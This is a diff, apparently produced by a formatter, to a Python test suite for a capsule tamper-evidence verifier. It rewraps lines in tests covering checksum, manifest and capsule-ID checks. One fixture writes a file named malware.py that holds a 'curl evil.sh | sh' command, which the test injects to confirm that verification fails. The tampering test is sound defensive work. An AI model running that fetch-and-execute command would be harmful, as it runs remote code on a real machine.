@@ -7,6 +7,7 @@ Layer 3: recomputed capsule ID vs a caller-supplied trusted ID
 Layers 2 and 3 are what make the capsule tamper-*evident*: layer 1 alone is
 defeated by any attacker who re-runs `save_checksums` after editing a payload.
 """
+
 import hashlib
 import json
 from pathlib import Path
@@ -50,7 +51,9 @@ def _rewrite_checksums(capsule_dir: Path) -> None:
         if fp.is_file() and fp.name not in {".checksums", "capsule.yaml"}:
             rel = fp.relative_to(capsule_dir).as_posix()
             checksums[rel] = "sha256:" + hashlib.sha256(fp.read_bytes()).hexdigest()
-    (capsule_dir / ".checksums").write_text(yaml.dump(checksums, default_flow_style=False, sort_keys=True))
+    (capsule_dir / ".checksums").write_text(
+        yaml.dump(checksums, default_flow_style=False, sort_keys=True)
+    )
 
 
 # --- Layer 3 precondition: the ID printed at seal must be recomputable ------
@@ -110,7 +113,9 @@ def test_manifest_edit_detected_against_expected_id(tmp_path):
 
     manifest = load_manifest_yaml((capsule_dir / "capsule.yaml").read_text())
     manifest["sealed_by"] = "somebody-else"
-    (capsule_dir / "capsule.yaml").write_text(yaml.dump(manifest, default_flow_style=False, sort_keys=False))
+    (capsule_dir / "capsule.yaml").write_text(
+        yaml.dump(manifest, default_flow_style=False, sort_keys=False)
+    )
 
     result = CapsuleVerifier.verify_integrity(capsule_dir, expected_id=sealed_id)
     assert result["status"] == "fail", result
@@ -124,7 +129,9 @@ def test_missing_checksums_digest_on_sealed_capsule_fails(tmp_path):
 
     manifest = load_manifest_yaml((capsule_dir / "capsule.yaml").read_text())
     del manifest["checksums_digest"]
-    (capsule_dir / "capsule.yaml").write_text(yaml.dump(manifest, default_flow_style=False, sort_keys=False))
+    (capsule_dir / "capsule.yaml").write_text(
+        yaml.dump(manifest, default_flow_style=False, sort_keys=False)
+    )
 
     result = CapsuleVerifier.verify_integrity(capsule_dir)
     assert result["status"] == "fail", result
@@ -156,7 +163,9 @@ def test_verify_integrity_reports_computed_id(tmp_path):
 def test_injected_file_fails_verification(tmp_path):
     capsule_dir = tmp_path / "bell.capsule"
     _seal(capsule_dir)
-    (capsule_dir / "payload" / "malware.py").write_text("import os; os.system('curl evil.sh | sh')\n")
+    (capsule_dir / "payload" / "malware.py").write_text(
+        "import os; os.system('curl evil.sh | sh')\n"
+    )
 
     result = CapsuleVerifier.verify_checksums(capsule_dir)
     assert result["status"] == "fail", result
@@ -190,6 +199,7 @@ def test_injected_file_fails_full_integrity_check(tmp_path):
 
 def test_cli_verify_rejects_recomputed_checksums(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -205,6 +215,7 @@ def test_cli_verify_rejects_recomputed_checksums(tmp_path):
 
 def test_cli_verify_id_match_exits_0(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -216,6 +227,7 @@ def test_cli_verify_id_match_exits_0(tmp_path):
 
 def test_cli_verify_id_mismatch_exits_1(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -232,6 +244,7 @@ def test_cli_verify_id_mismatch_exits_1(tmp_path):
 def test_cli_verify_reports_capsule_id(tmp_path):
     """Users need the recomputed ID to record as trusted for later --id checks."""
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -245,6 +258,7 @@ def test_cli_verify_reports_capsule_id(tmp_path):
 def test_cli_verify_without_id_says_manifest_unauthenticated(tmp_path):
     """Passing without --id must not read as a full tamper-evidence guarantee."""
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -257,6 +271,7 @@ def test_cli_verify_without_id_says_manifest_unauthenticated(tmp_path):
 
 def test_cli_verify_json_includes_layers(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -271,6 +286,7 @@ def test_cli_verify_json_includes_layers(tmp_path):
 
 def test_cli_open_refuses_injected_file(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -285,6 +301,7 @@ def test_cli_open_refuses_injected_file(tmp_path):
 
 def test_cli_open_refuses_recomputed_checksums(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -316,8 +333,9 @@ def test_nested_capsule_yaml_is_checksummed(tmp_path):
     (capsule_dir / "capsule.yaml").write_text("version: '1.0.0'\n")
 
     raw = CapsuleBuilder().save_checksums(capsule_dir).read_text()
-    checksums = {line.split("  ", 1)[1]: line.split("  ", 1)[0]
-                 for line in raw.splitlines() if line.strip()}
+    checksums = {
+        line.split("  ", 1)[1]: line.split("  ", 1)[0] for line in raw.splitlines() if line.strip()
+    }
     assert "payload/capsule.yaml" in checksums
     assert "capsule.yaml" not in checksums
 
@@ -343,7 +361,6 @@ def test_injected_nested_checksums_file_fails_verification(tmp_path):
 
 
 # --- --id must not be silently ignored on the statistical path -------------
-
 
 
 # --- Malformed manifests must fail cleanly, not raise ----------------------
@@ -379,6 +396,7 @@ def test_empty_manifest_fails_without_raising(tmp_path):
 
 def test_cli_verify_malformed_manifest_exits_1_without_traceback(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
@@ -392,12 +410,15 @@ def test_cli_verify_malformed_manifest_exits_1_without_traceback(tmp_path):
 
 def test_cli_open_id_mismatch_refuses(tmp_path):
     from click.testing import CliRunner
+
     from marqov_capsule.cli.main import cli
 
     capsule_dir = tmp_path / "bell.capsule"
     _seal(capsule_dir)
 
     dest = tmp_path / "out"
-    result = CliRunner().invoke(cli, ["open", str(capsule_dir), "--id", "mqc:1:" + "0" * 64, "--dest", str(dest)])
+    result = CliRunner().invoke(
+        cli, ["open", str(capsule_dir), "--id", "mqc:1:" + "0" * 64, "--dest", str(dest)]
+    )
     assert result.exit_code == 1, result.output
     assert not (dest / "bell.capsule").exists()
